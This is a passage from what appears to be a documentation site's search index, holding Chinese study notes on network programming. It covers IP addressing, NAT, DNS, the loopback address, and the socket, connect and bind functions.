\u200b\u7f51\u7edc\u200b\u4e2d\u200b\uff0cIP \u200b\u5730\u5740\u200b\u7531\u200b\u7f51\u7edc\u200b\u90e8\u5206\u200b\u548c\u200b\u4e3b\u673a\u200b\u90e8\u5206\u200b\u7ec4\u6210\u200b\u3002\u200b\u5f53\u200b\u4f60\u200b\u628a\u200b\u4e3b\u673a\u200b\u90e8\u5206\u200b\u7684\u200b\u6240\u6709\u200b\u6bd4\u7279\u200b\u4f4d\u200b\uff08Binary Bits\uff09\u200b\u5168\u90e8\u200b\u8bbe\u200b\u4e3a\u200b 0 \u200b\u6216\u200b\u5168\u90e8\u200b\u8bbe\u200b\u4e3a\u200b 1 \u200b\u65f6\u200b\uff0c\u200b\u5b83\u4eec\u200b\u5177\u6709\u200b\u7279\u6b8a\u200b\u7684\u200b\u542b\u4e49\u200b\uff0c\u200b\u4e0d\u80fd\u200b\u5206\u914d\u200b\u7ed9\u200b\u5177\u4f53\u200b\u7684\u200b\u7535\u8111\u200b\u3001\u200b\u624b\u673a\u200b\u7b49\u200b\u8bbe\u5907\u200b\u4f7f\u7528\u200b\u3002\u200b\u5168\u200b 0 \u200b\u4ee3\u8868\u200b\u7f51\u7edc\u200b\u672c\u8eab\u200b, \u200b\u5168\u200b 1 \u200b\u4ee3\u8868\u200b\u5e7f\u64ad\u200b.</p>"},{"location":"notes/ICS/Chapter%2011.B%20Network%20Programming/#ip","title":"IP \u200b\u5730\u5740\u200b\u7ed3\u6784","text":"<p>\u200b\u4e3a\u4ec0\u4e48\u200b\u8981\u200b\u6709\u200b\u79c1\u6709\u200b IP?</p> <p>\ud83c\udf0d \u200b\u5168\u7403\u200b\u516c\u6709\u200b IP \u200b\u5730\u5740\u200b\u8d44\u6e90\u200b\u7684\u200b\u9650\u5236\u200b (IPv4)</p> <p>\u200b\u8fd9\u200b\u662f\u200b\u6700\u200b\u4e3b\u8981\u200b\u7684\u200b\u539f\u56e0\u200b\uff1a</p> <ul> <li>\u200b\u5730\u5740\u200b\u8017\u5c3d\u200b\uff1a IPv4 \u200b\u5730\u5740\u200b\u53ea\u6709\u200b\u7ea6\u200b 43 \u200b\u4ebf\u4e2a\u200b\u3002\u200b\u5982\u679c\u200b\u5168\u7403\u200b\u6bcf\u200b\u4e00\u4e2a\u200b\u8054\u7f51\u200b\u8bbe\u5907\u200b\uff08\u200b\u5305\u62ec\u200b\u60a8\u200b\u7684\u200b\u624b\u673a\u200b\u3001\u200b\u7535\u8111\u200b\u3001\u200b\u667a\u80fd\u5bb6\u5c45\u200b\u8bbe\u5907\u200b\u7b49\u200b\uff09\u200b\u90fd\u200b\u8981\u6c42\u200b\u4e00\u4e2a\u200b\u552f\u4e00\u200b\u7684\u200b\u516c\u6709\u200b IP \u200b\u5730\u5740\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u8d44\u6e90\u200b\u6c60\u200b\u65e9\u5c31\u200b\u8017\u5c3d\u200b\u4e86\u200b\u3002</li> <li>\u200b\u89e3\u51b3\u65b9\u6848\u200b\uff1a \u200b\u901a\u8fc7\u200b\u5212\u5206\u200b\u79c1\u6709\u200b IP \u200b\u5730\u5740\u200b\u8303\u56f4\u200b\uff08\\(10.x.x.x\\)\u3001\\(172.16.x.x\\)\u3001\\(192.168.x.x\\)\uff09\u200b\u548c\u200b\u4f7f\u7528\u200b NAT (\u200b\u7f51\u7edc\u5730\u5740\u200b\u8f6c\u6362\u200b) \u200b\u6280\u672f\u200b\uff0c\u200b\u4e00\u4e2a\u200b\u5bb6\u5ead\u200b\u6216\u200b\u4f01\u4e1a\u200b\u5185\u90e8\u200b\u7684\u200b\u6570\u5343\u53f0\u200b\u8bbe\u5907\u200b\u53ef\u4ee5\u200b\u5171\u4eab\u200b\u4e00\u4e2a\u200b\u6216\u200b\u51e0\u4e2a\u200b\u516c\u6709\u200b IP \u200b\u5730\u5740\u200b\u6765\u200b\u8bbf\u95ee\u200b\u4e92\u8054\u7f51\u200b\u3002\u200b\u8fd9\u200b\u6781\u5927\u200b\u5730\u200b\u7f13\u89e3\u200b\u4e86\u200b IPv4 \u200b\u5730\u5740\u200b\u7684\u200b\u538b\u529b\u200b\u3002</li> </ul> <p>\ud83d\udd12 \u200b\u5b89\u5168\u6027\u200b\u7684\u200b\u63d0\u5347\u200b    \u200b\u79c1\u6709\u200b IP \u200b\u5730\u5740\u200b\u548c\u200b NAT \u200b\u673a\u5236\u200b\u5929\u7136\u200b\u5730\u4e3a\u200b\u5185\u90e8\u200b\u7f51\u7edc\u200b\u63d0\u4f9b\u200b\u4e86\u200b\u4e00\u5c42\u200b\u5b89\u5168\u200b\u4fdd\u62a4\u200b\uff1a</p> <ul> <li>\u200b\u4e0d\u53ef\u200b\u8def\u7531\u200b\u6027\u200b\uff1a \u200b\u79c1\u6709\u200b IP \u200b\u5730\u5740\u200b\u5728\u200b\u4e92\u8054\u7f51\u200b\u4e0a\u200b\u662f\u200b\u4e0d\u53ef\u200b\u8def\u7531\u200b\u7684\u200b\u3002\u200b\u4e92\u8054\u7f51\u200b\u4e0a\u200b\u7684\u200b\u8def\u7531\u5668\u200b\u88ab\u200b\u914d\u7f6e\u200b\u4e3a\u200b\u4e22\u5f03\u200b\u6240\u6709\u200b\u76ee\u6807\u200b\u5730\u5740\u200b\u662f\u200b\u79c1\u6709\u200b IP \u200b\u5730\u5740\u200b\u7684\u200b\u6570\u636e\u5305\u200b\u3002</li> <li>\u200b\u9690\u85cf\u200b\u5185\u90e8\u7ed3\u6784\u200b\uff1a \u200b\u5916\u90e8\u200b\u653b\u51fb\u8005\u200b\u65e0\u6cd5\u200b\u76f4\u63a5\u200b\u901a\u8fc7\u200b\u60a8\u200b\u7684\u200b\u516c\u6709\u200b IP \u200b\u5730\u5740\u200b\u83b7\u77e5\u200b\u60a8\u200b\u7684\u200b\u5185\u90e8\u200b\u7f51\u7edc\u7ed3\u6784\u200b\u3001\u200b\u8bbe\u5907\u200b\u6570\u91cf\u200b\u548c\u200b\u5177\u4f53\u200b\u7684\u200b\u79c1\u6709\u200b IP \u200b\u5730\u5740\u200b\u3002\u200b\u4ed6\u4eec\u200b\u65e0\u6cd5\u200b\u76f4\u63a5\u200b\u5bfb\u5740\u200b\u60a8\u200b\u7684\u200b\u5185\u90e8\u200b\u8bbe\u5907\u200b\u3002</li> <li>NAT \u200b\u5c4f\u969c\u200b\uff1a \u200b\u53ea\u6709\u200b\u5185\u90e8\u200b\u8bbe\u5907\u200b\u4e3b\u52a8\u200b\u53d1\u8d77\u200b\u8fde\u63a5\u200b\u65f6\u200b\uff0cNAT \u200b\u624d\u200b\u4f1a\u200b\u4e3a\u200b\u5176\u200b\u521b\u5efa\u200b\u6620\u5c04\u200b\u3002\u200b\u5916\u90e8\u8bbe\u5907\u200b\u65e0\u6cd5\u200b\u4e3b\u52a8\u200b\u53d1\u8d77\u200b\u5bf9\u200b\u5185\u90e8\u200b\u79c1\u6709\u200b IP \u200b\u5730\u5740\u200b\u7684\u200b\u8fde\u63a5\u200b\uff0c\u200b\u9664\u975e\u200b\u8def\u7531\u5668\u200b\u6216\u200b\u9632\u706b\u5899\u200b\u88ab\u200b\u914d\u7f6e\u200b\u4e86\u200b\u7aef\u53e3\u200b\u8f6c\u53d1\u200b\u89c4\u5219\u200b\u3002 </li> </ul> <p>\u2699\ufe0f \u200b\u7075\u6d3b\u6027\u200b\u548c\u200b\u7ba1\u7406\u6548\u7387\u200b</p> <ul> <li>\u200b\u672c\u5730\u200b\u5730\u5740\u200b\u5206\u914d\u200b\uff1a \u200b\u4f7f\u7528\u200b\u79c1\u6709\u200b IP \u200b\u5730\u5740\u200b\uff0c\u200b\u7f51\u7edc\u7ba1\u7406\u5458\u200b\uff08\u200b\u6216\u200b\u60a8\u200b\u7684\u200b\u5bb6\u7528\u200b\u8def\u7531\u5668\u200b\uff09\u200b\u53ef\u4ee5\u200b\u81ea\u7531\u200b\u5730\u200b\u3001\u200b\u672c\u5730\u200b\u5730\u200b\u5206\u914d\u200b IP \u200b\u5730\u5740\u200b\uff0c\u200b\u65e0\u9700\u200b\u5411\u200b\u4efb\u4f55\u200b\u4e92\u8054\u7f51\u200b\u6743\u5a01\u673a\u6784\u200b\u6ce8\u518c\u200b\u6216\u200b\u62a5\u544a\u200b\u3002</li> <li>\u200b\u7f51\u7edc\u200b\u8fc1\u79fb\u200b\uff1a \u200b\u5982\u679c\u200b\u60a8\u200b\u7684\u200b\u516c\u53f8\u200b\u66f4\u6362\u200b\u4e86\u200b ISP\uff08\u200b\u4e92\u8054\u7f51\u200b\u670d\u52a1\u63d0\u4f9b\u5546\u200b\uff09\uff0c\u200b\u60a8\u200b\u7684\u200b\u516c\u6709\u200b IP \u200b\u5730\u5740\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u6539\u53d8\u200b\u3002\u200b\u4f46\u662f\u200b\uff0c\u200b\u60a8\u200b\u7684\u200b\u5185\u90e8\u200b\u7f51\u7edc\u200b\u4f7f\u7528\u200b\u7684\u200b\u79c1\u6709\u200b IP \u200b\u5730\u5740\u200b\u53ef\u4ee5\u200b\u4fdd\u6301\u200b\u4e0d\u53d8\u200b\uff0c\u200b\u5927\u5927\u7b80\u5316\u200b\u4e86\u200b\u7f51\u7edc\u200b\u8fc1\u79fb\u200b\u548c\u200b\u7ef4\u62a4\u200b\u5de5\u4f5c\u200b\u3002</li> </ul>"},{"location":"notes/ICS/Chapter%2011.B%20Network%20Programming/#1132","title":"11.3.2 \u200b\u56e0\u7279\u7f51\u200b\u57df\u540d","text":"<p>\u200b\u7531\u4e8e\u200b IP \u200b\u5730\u5740\u200b\u5f88\u96be\u200b\u8bb0\u4f4f\u200b, \u200b\u6240\u4ee5\u200b\u56e0\u7279\u7f51\u200b\u5b9a\u4e49\u200b\u4e86\u200b\u4e00\u7ec4\u200b\u66f4\u52a0\u200b\u4eba\u6027\u5316\u200b\u7684\u200b\u57df\u540d\u200b (domain name), \u200b\u4ee5\u53ca\u200b\u4e00\u79cd\u200b\u5c06\u200b\u57df\u540d\u200b\u6620\u5c04\u200b\u5230\u200b IP \u200b\u5730\u5740\u200b\u7684\u200b\u673a\u5236\u200b. \u200b\u57df\u540d\u200b\u662f\u200b\u4e00\u4e32\u200b\u7528\u200b\u53e5\u70b9\u200b\u5206\u5272\u200b\u7684\u200b\u5355\u8bcd\u200b, \u200b\u4f8b\u5982\u200b whaleshark.ics.cs.cmu.edu</p> <p>\u200b\u57df\u540d\u200b\u96c6\u5408\u200b\u5f62\u6210\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u5c42\u6b21\u7ed3\u6784\u200b, \u200b\u6bcf\u4e2a\u200b\u57df\u540d\u200b\u7f16\u7801\u200b\u4e86\u200b\u5b83\u200b\u5728\u200b\u8fd9\u4e2a\u200b\u5c42\u6b21\u200b\u4e2d\u200b\u7684\u200b\u4f4d\u7f6e\u200b. \u200b\u6811\u200b\u7684\u200b\u8282\u70b9\u200b\u53cd\u5411\u200b\u5230\u200b\u6839\u200b\u7684\u200b\u8def\u5f84\u200b\u5f62\u6210\u200b\u4e86\u200b\u57df\u540d\u200b. \u200b\u5b50\u6811\u200b\u79f0\u4e3a\u200b\u5b50\u57df\u200b. </p> <p></p> <p>\u200b\u56e0\u7279\u7f51\u200b\u5b9a\u4e49\u200b\u4e86\u200b\u57df\u540d\u200b\u96c6\u5408\u200b\u548c\u200b IP \u200b\u5730\u5740\u200b\u96c6\u5408\u200b\u4e4b\u95f4\u200b\u7684\u200b\u6620\u5c04\u200b, \u200b\u8fd9\u4e2a\u200b\u6620\u5c04\u200b\u662f\u200b\u901a\u8fc7\u200b\u5206\u5e03\u200b\u4e16\u754c\u200b\u8303\u56f4\u200b\u5185\u200b\u7684\u200b\u6570\u636e\u5e93\u200b (\u200b\u79f0\u4e3a\u200b DNS(Domain Name System), \u200b\u57df\u540d\u200b\u7cfb\u7edf\u200b)\u200b\u6765\u200b\u7ef4\u62a4\u200b\u7684\u200b. DNS \u200b\u6570\u636e\u5e93\u200b\u7531\u200b\u4e0a\u767e\u4e07\u200b\u7684\u200b\u4e3b\u673a\u200b\u6761\u76ee\u200b\u7ed3\u6784\u200b\u7ec4\u6210\u200b, \u200b\u6bcf\u6761\u200b\u5b9a\u4e49\u200b\u4e86\u200b\u4e00\u7ec4\u200b\u57df\u540d\u200b\u548c\u200b\u4e00\u7ec4\u200b IP \u200b\u5730\u5740\u200b\u4e4b\u95f4\u200b\u7684\u200b\u6620\u5c04\u200b.</p> <p>\u200b\u6bcf\u53f0\u200b\u56e0\u7279\u7f51\u200b\u4e3b\u673a\u200b\u90fd\u200b\u6709\u200b\u672c\u5730\u200b\u5b9a\u4e49\u200b\u7684\u200b\u57df\u540d\u200b localhost, \u200b\u8fd9\u4e2a\u200b\u57df\u540d\u200b\u603b\u662f\u200b\u6620\u5c04\u200b\u4e3a\u200b\u56de\u9001\u200b\u5730\u5740\u200b 127.0.0.1</p> <p>\u200b\u56de\u9001\u200b\u5730\u5740\u200b(\u200b\u56de\u73af\u200b\u5730\u5740\u200b)</p> <p>\u200b\u56de\u73af\u200b\u5730\u5740\u200b\u5c5e\u4e8e\u200b\u7279\u6b8a\u200b\u7684\u200b A \u200b\u7c7b\u200b\u5730\u5740\u200b\u8303\u56f4\u200b\uff08\u200b\u4ece\u200b \\(127.0.0.0\\) \u200b\u5230\u200b \\(127.255.255.255\\)\uff09\uff0c\u200b\u4e3b\u8981\u200b\u7528\u4e8e\u200b\u4ee5\u4e0b\u200b\u76ee\u7684\u200b\uff1a</p> <ol> <li>\u200b\u6307\u5411\u200b\u672c\u200b\u673a\u200b\uff1a <code>127.0.0.1</code> \u200b\u59cb\u7ec8\u200b\u6307\u5411\u200b\u5f53\u524d\u200b\u6b63\u5728\u200b\u4f7f\u7528\u200b\u5b83\u200b\u7684\u200b\u8bbe\u5907\u200b\u672c\u8eab\u200b\u3002\u200b\u5b83\u200b\u4e5f\u200b\u88ab\u200b\u79f0\u4e3a\u200b <code>localhost</code>\u3002</li> <li>\u200b\u672c\u5730\u200b\u6d4b\u8bd5\u200b\uff1a \u200b\u5b83\u200b\u7528\u4e8e\u200b\u5728\u200b\u672c\u5730\u200b\u6d4b\u8bd5\u200b\u7f51\u7edc\u5e94\u7528\u200b\u7a0b\u5e8f\u200b\u548c\u200b\u670d\u52a1\u200b\u3002\u200b\u5f53\u200b\u4e00\u4e2a\u200b\u7a0b\u5e8f\u200b\uff08\u200b\u5982\u200b Web \u200b\u6d4f\u89c8\u5668\u200b\uff09\u200b\u8fde\u63a5\u200b\u5230\u200b <code>127.0.0.1</code> \u200b\u65f6\u200b\uff0c\u200b\u6570\u636e\u5305\u200b\u4e0d\u4f1a\u200b\u79bb\u5f00\u200b\u8bbe\u5907\u200b\uff0c\u200b\u800c\u662f\u200b\u76f4\u63a5\u200b\u901a\u8fc7\u200b\u5185\u90e8\u200b\u7684\u200b\u7f51\u7edc\u534f\u8bae\u200b\u6808\u200b\u88ab\u200b\u53d1\u9001\u200b\u56de\u200b\u81ea\u5df1\u200b\u3002</li> <li>\u200b\u7f51\u7edc\u200b\u8bca\u65ad\u200b\uff1a \u200b\u5982\u679c\u200b\u5bf9\u200b <code>127.0.0.1</code> \u200b\u7684\u200b ping \u200b\u6d4b\u8bd5\u200b\u5931\u8d25\u200b\uff0c\u200b\u901a\u5e38\u200b\u8868\u793a\u200b\u672c\u200b\u673a\u7cfb\u7edf\u200b\u7684\u200b TCP/IP \u200b\u534f\u8bae\u200b\u6808\u200b\u5728\u200b\u4e25\u91cd\u200b\u6545\u969c\u200b\u3002</li> </ol> <p></p>"},{"location":"notes/ICS/Chapter%2011.B%20Network%20Programming/#1133","title":"11.3.3 \u200b\u56e0\u7279\u7f51\u200b\u8fde\u63a5","text":"<p>\u200b\u56e0\u7279\u7f51\u200b\u5ba2\u6237\u7aef\u200b\u548c\u200b\u670d\u52a1\u5668\u200b\u901a\u8fc7\u200b\u5728\u200b\u8fde\u63a5\u200b\u4e0a\u200b\u53d1\u9001\u200b\u548c\u200b\u63a5\u53d7\u200b\u5b57\u8282\u200b\u5218\u6765\u200b\u901a\u4fe1\u200b. \u200b\u4ece\u200b\u8fde\u63a5\u200b\u4e00\u5bf9\u200b\u8fdb\u7a0b\u200b\u7684\u200b\u610f\u4e49\u200b\u4e0a\u200b\u800c\u8a00\u200b, \u200b\u8fde\u63a5\u200b\u662f\u200b\u70b9\u5bf9\u70b9\u200b\u7684\u200b. \u200b\u4ece\u200b\u6570\u636e\u200b\u53ef\u4ee5\u200b\u540c\u65f6\u200b\u53cc\u5411\u200b\u6d41\u52a8\u200b\u7684\u200b\u89d2\u5ea6\u200b\u6765\u8bf4\u200b, \u200b\u5b83\u200b\u662f\u200b\u5168\u53cc\u5de5\u200b\u7684\u200b. \u200b\u5e76\u4e14\u200b\u4ece\u7531\u6e90\u200b\u8fdb\u7a0b\u200b\u53d1\u51fa\u200b\u7684\u200b\u5b57\u8282\u200b\u6d41\u200b\u6700\u7ec8\u200b\u88ab\u200b\u76ee\u7684\u200b\u8fdb\u7a0b\u200b\u4ee5\u200b\u5b83\u200b\u53d1\u51fa\u200b\u7684\u200b\u987a\u5e8f\u200b\u6536\u5230\u200b\u5b83\u200b\u7684\u200b\u89d2\u5ea6\u200b\u6765\u8bf4\u200b, \u200b\u5b83\u200b\u4e5f\u200b\u662f\u200b \u200b\u53ef\u9760\u200b\u7684\u200b.</p> <p>\u200b\u4e00\u4e2a\u5957\u200b\u63a5\u5b57\u200b\u5c31\u662f\u200b\u8fde\u63a5\u200b\u7684\u200b\u4e00\u4e2a\u200b\u7aef\u70b9\u200b. \u200b\u6bcf\u4e2a\u200b\u5957\u200b\u63a5\u5b57\u200b\u90fd\u200b\u6709\u200b\u76f8\u5e94\u200b\u7684\u200b\u5957\u200b\u63a5\u5b57\u200b\u5730\u5740\u200b, \u200b\u662f\u200b\u7531\u200b\u4e00\u4e2a\u200b\u56e0\u7279\u7f51\u200b\u5730\u5740\u200b\u548c\u200b\u4e00\u4e2a\u200b 16 \u200b\u4f4d\u200b\u7684\u200b\u6574\u6570\u200b\u7aef\u53e3\u200b\u7ec4\u6210\u200b\u7684\u200b, \u200b\u7528\u200b<code>\u200b\u5730\u5740\u200b:\u200b\u7aef\u53e3\u200b</code>\u200b\u6765\u200b\u8868\u793a\u200b</p> <p>\u200b\u5f53\u200b\u5ba2\u6237\u7aef\u200b\u53d1\u8d77\u200b\u8fde\u63a5\u200b\u8bf7\u6c42\u200b\u65f6\u200b, \u200b\u5ba2\u6237\u7aef\u200b\u5957\u200b\u63a5\u5b57\u200b\u5730\u5740\u200b\u4e2d\u200b\u7684\u200b\u7aef\u53e3\u200b\u662f\u200b\u7531\u200b\u5185\u6838\u200b\u81ea\u52a8\u200b\u5206\u914d\u200b\u7684\u200b, \u200b\u79f0\u4e3a\u200b\u4e34\u65f6\u200b\u7aef\u53e3\u200b. \u200b\u7136\u800c\u200b, \u200b\u670d\u52a1\u5668\u200b\u5957\u200b\u63a5\u5b57\u200b\u5730\u5740\u200b\u4e2d\u200b\u7684\u200b\u7aef\u53e3\u200b\u901a\u5e38\u200b\u662f\u200b\u67d0\u4e2a\u200b\u77e5\u540d\u200b\u7aef\u53e3\u200b, \u200b\u662f\u200b\u548c\u200b\u8fd9\u4e2a\u200b\u670d\u52a1\u200b\u76f8\u5bf9\u200b\u5e94\u200b\u7684\u200b. \u200b\u4f8b\u5982\u200b, Web \u200b\u670d\u52a1\u5668\u200b\u901a\u5e38\u200b\u4f7f\u7528\u200b\u7aef\u53e3\u200b 80, \u200b\u7535\u5b50\u90ae\u4ef6\u200b\u670d\u52a1\u5668\u200b\u901a\u5e38\u200b\u4f7f\u7528\u200b\u7aef\u53e3\u200b 25. \u200b\u6bcf\u4e2a\u200b\u5177\u6709\u200b\u77e5\u540d\u200b\u7aef\u53e3\u200b\u7684\u200b\u670d\u52a1\u200b\u90fd\u200b\u6709\u200b\u4e00\u4e2a\u200b\u5bf9\u5e94\u200b\u7684\u200b\u77e5\u540d\u200b\u7684\u200b\u670d\u52a1\u200b\u540d\u200b. \u200b\u4f8b\u5982\u200b Web \u200b\u670d\u52a1\u200b\u7684\u200b\u77e5\u540d\u200b\u540d\u5b57\u200b\u662f\u200b http, email \u200b\u662f\u200b smtp. \u200b\u6587\u4ef6\u200b /etc/services \u200b\u5305\u542b\u200b\u4e00\u5f20\u200b\u8fd9\u53f0\u200b\u673a\u5668\u200b\u63d0\u4f9b\u200b\u7684\u200b\u77e5\u540d\u200b\u540d\u5b57\u200b\u548c\u200b\u77e5\u540d\u200b\u7aef\u53e3\u200b\u4e4b\u95f4\u200b\u7684\u200b\u6620\u5c04\u200b.</p> <p>\u200b\u4e00\u4e2a\u200b\u8fde\u63a5\u200b\u662f\u200b\u7531\u200b\u4e24\u7aef\u200b\u7684\u200b\u5957\u200b\u63a5\u5b57\u200b\u5730\u5740\u200b\u552f\u4e00\u200b\u51b3\u5b9a\u200b\u7684\u200b, \u200b\u8fd9\u200b\u5bf9\u200b\u5957\u200b\u63a5\u5b57\u200b\u5730\u5740\u200b\u53eb\u505a\u200b\u5957\u200b\u63a5\u5b57\u200b\u5bf9\u200b, \u200b\u7528\u200b\u4ee5\u4e0b\u200b\u5143\u7ec4\u200b\u8868\u793a\u200b:</p> \\[ (\\text{cliaddr:cliport, servaddr:servport}) \\] <p></p>"},{"location":"notes/ICS/Chapter%2011.B%20Network%20Programming/#114","title":"11.4 \u200b\u5957\u200b\u63a5\u5b57\u200b\u63a5\u53e3","text":"<p>\u200b\u5957\u200b\u63a5\u5b57\u200b\u63a5\u53e3\u200b\u662f\u200b\u4e00\u7ec4\u200b\u51fd\u6570\u200b, \u200b\u5b83\u4eec\u200b\u548c\u200b Unix I/O \u200b\u51fd\u6570\u200b\u7ed3\u5408\u200b\u8d77\u6765\u200b, \u200b\u7528\u4ee5\u200b\u521b\u5efa\u200b\u7f51\u7edc\u5e94\u7528\u200b. </p>"},{"location":"notes/ICS/Chapter%2011.B%20Network%20Programming/#1141","title":"11.4.1 \u200b\u5957\u200b\u63a5\u5b57\u200b\u5730\u5740\u200b\u7ed3\u6784","text":"<p>\u200b\u4ece\u200b Linux \u200b\u5185\u6838\u200b\u7684\u200b\u89d2\u5ea6\u200b\u6765\u770b\u200b, \u200b\u4e00\u4e2a\u5957\u200b\u63a5\u5b57\u200b\u5c31\u662f\u200b\u901a\u4fe1\u200b\u7684\u200b\u4e00\u4e2a\u200b\u7aef\u70b9\u200b, \u200b\u4ece\u200b Linux \u200b\u7a0b\u5e8f\u200b\u7684\u200b\u89d2\u5ea6\u200b\u6765\u770b\u200b, \u200b\u5957\u200b\u63a5\u5b57\u200b\u5c31\u662f\u200b\u4e00\u4e2a\u200b\u6709\u200b\u76f8\u5e94\u200b\u63cf\u8ff0\u7b26\u200b\u7684\u200b\u6253\u5f00\u200b\u6587\u4ef6\u200b.</p> <p>\u200b\u5957\u200b\u63a5\u5b57\u200b\u5730\u5740\u200b\u5b58\u653e\u200b\u5728\u200b\u5982\u56fe\u6240\u793a\u200b\u7684\u200b\u7c7b\u578b\u200b\u4e3a\u200b <code>sockaddr_in</code> \u200b\u7684\u200b 16 \u200b\u5b57\u8282\u200b\u7ed3\u6784\u200b\u4e2d\u200b.  </p> <p><code>sin_family</code> \u200b\u5b57\u200b\u6bb5\u200b\u7528\u4e8e\u200b\u6307\u5b9a\u200b\u6b64\u5957\u200b\u63a5\u5b57\u200b\u5730\u5740\u200b\u5c06\u200b\u4f7f\u7528\u200b\u7684\u200b\u534f\u8bae\u200b\u65cf\u200b\u6216\u200b\u5730\u5740\u200b\u65cf\u200b (Address Family)\u3002</p> <ul> <li> <p>\u200b\u503c\u200b\uff1a \u200b\u5b83\u200b\u662f\u200b\u4e00\u4e2a\u6574\u200b\u6570\u503c\u200b\uff0c\u200b\u4f46\u200b\u901a\u5e38\u200b\u4f7f\u7528\u200b\u5b8f\u6765\u200b\u8868\u793a\u200b\u7279\u5b9a\u200b\u7684\u200b\u534f\u8bae\u200b\u65cf\u200b\u3002</p> </li> <li> <p>\u200b\u6700\u200b\u5e38\u89c1\u200b\u7684\u200b\u503c\u200b\uff1a</p> <ul> <li> <p><code>AF_INET</code> (Address Family Internet)\uff1a\u200b\u7528\u4e8e\u200b IPv4 \u200b\u534f\u8bae\u200b\u3002\u200b\u8fd9\u662f\u200b\u4e92\u8054\u7f51\u200b\u901a\u4fe1\u200b\u6700\u200b\u5e38\u7528\u200b\u7684\u200b\u503c\u200b\u3002</p> </li> <li> <p><code>AF_INET6</code> (Address Family Internet 6)\uff1a\u200b\u7528\u4e8e\u200b IPv6 \u200b\u534f\u8bae\u200b\u3002</p> </li> <li> <p><code>AF_UNIX</code> \u200b\u6216\u200b <code>AF_LOCAL</code>\uff1a\u200b\u7528\u4e8e\u200b\u540c\u4e00\u200b\u64cd\u4f5c\u7cfb\u7edf\u200b\u5185\u200b\u4e0d\u540c\u200b\u8fdb\u7a0b\u200b\u4e4b\u95f4\u200b\u7684\u200b\u672c\u5730\u200b\u901a\u4fe1\u200b\uff08Unix \u200b\u57df\u5957\u200b\u63a5\u5b57\u200b\uff09\u3002</p> </li> </ul> </li> </ul> <p><code>sin_port</code> \u200b\u6210\u5458\u200b\u662f\u200b\u4e00\u4e2a\u200b 16 \u200b\u4f4d\u200b\u7684\u200b\u7aef\u53e3\u53f7\u200b</p> <p><code>sin_addr</code> \u200b\u6210\u5458\u200b\u662f\u200b\u4e00\u4e2a\u200b 32 \u200b\u4f4d\u200b\u7684\u200b IP \u200b\u5730\u5740\u200b. IP \u200b\u5730\u5740\u200b\u548c\u200b\u7aef\u53e3\u53f7\u200b\u603b\u662f\u200b\u4ee5\u200b\u7f51\u7edc\u200b\u5b57\u8282\u200b\u987a\u5e8f\u200b(\u200b\u5927\u7aef\u6cd5\u200b)\u200b\u5b58\u653e\u200b\u7684\u200b.</p> <p></p>"},{"location":"notes/ICS/Chapter%2011.B%20Network%20Programming/#1142-socket","title":"11.4.2 socket \u200b\u51fd\u6570","text":"<p>\u200b\u5ba2\u6237\u7aef\u200b\u548c\u200b\u670d\u52a1\u5668\u200b\u4f7f\u7528\u200b socket \u200b\u51fd\u6570\u200b\u6765\u200b\u521b\u5efa\u200b\u4e00\u4e2a\u5957\u200b\u63a5\u5b57\u200b\u63cf\u8ff0\u7b26\u200b.</p> <p></p>"},{"location":"notes/ICS/Chapter%2011.B%20Network%20Programming/#1143-connect","title":"11.4.3 connect \u200b\u51fd\u6570","text":"<p>\u200b\u5ba2\u6237\u200b\u6bb5\u200b\u901a\u8fc7\u200b\u8c03\u7528\u200b connect \u200b\u51fd\u6570\u200b\u6765\u200b\u5efa\u7acb\u200b\u548c\u200b\u670d\u52a1\u5668\u200b\u7684\u200b\u8fde\u63a5\u200b.</p> <p></p> <p>connect \u200b\u51fd\u6570\u200b\u8bd5\u56fe\u200b\u4e0e\u200b\u5957\u200b\u63a5\u5b57\u200b\u5730\u5740\u200b\u4e3a\u200b <code>addr</code> \u200b\u7684\u200b\u670d\u52a1\u5668\u200b\u5efa\u7acb\u200b\u4e00\u4e2a\u200b\u56e0\u7279\u7f51\u200b\u8fde\u63a5\u200b, \u200b\u5176\u4e2d\u200b <code>addrlen</code> \u200b\u662f\u200b <code>sizeof(sockaddr_in)</code>. connect \u200b\u51fd\u6570\u200b\u4f1a\u200b\u963b\u585e\u200b, \u200b\u4e00\u81f4\u200b\u5230\u200b\u8fde\u63a5\u200b\u6210\u529f\u200b\u5efa\u7acb\u200b\u6216\u662f\u200b\u53d1\u751f\u200b\u9519\u8bef\u200b. \u200b\u5982\u679c\u200b\u6210\u529f\u200b, clientfd \u200b\u63cf\u8ff0\u200b\u73b0\u5728\u200b\u5c31\u200b\u51c6\u5907\u200b\u597d\u200b\u53ef\u4ee5\u200b\u8bfb\u5199\u200b\u4e86\u200b. \u200b\u5bf9\u4e8e\u200b socket, \u200b\u6700\u597d\u200b\u7684\u200b\u65b9\u6cd5\u200b\u662f\u200b\u7528\u200b <code>getaddrinfo</code> \u200b\u6765\u200b\u4e3a\u200b connect \u200b\u63d0\u4f9b\u200b\u53c2\u6570\u200b.</p>"},{"location":"notes/ICS/Chapter%2011.B%20Network%20Programming/#1144-bind","title":"11.4.4 bind \u200b\u51fd\u6570","text":"<p>\u200b\u5269\u4e0b\u200b\u7684\u200b\u5957\u200b\u63a5\u5b57\u200b\u51fd\u6570\u200b <code>bind, listen, accept</code> \u200b\u670d\u52a1\u5668\u200b\u7528\u200b\u5b83\u4eec\u200b\u6765\u200b\u548c\u200b\u5ba2\u6237\u7aef\u200b\u5efa\u7acb\u200b\u8fde\u63a5\u200b.</p> <p></p> <p><code>bind</code> \u200b\u51fd\u6570\u200b\u544a\u8bc9\u200b\u5185\u6838\u200b\u5c06\u200b <code>addr</code> \u200b\u4e2d\u200b\u7684\u200b\u670d\u52a1\u5668\u200b\u5957\u200b\u63a5\u5b57\u200b\u5730\u5740\u200b\u548c\u200b\u5957\u200b\u63a5\u5b57\u200b\u63cf\u8ff0\u7b26\u200b sockfd \u200b\u8054\u7cfb\u200b\u8d77\u6765\u200b. </p> <p>\u200b\u8fd9\u6837\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u5728\u200b\u6307\u5b9a\u200b\u7684\u200b\u7aef\u53e3\u200b\u8fdb\u884c\u200b\u8fde\u63a5\u200b\u4e86\u200b, 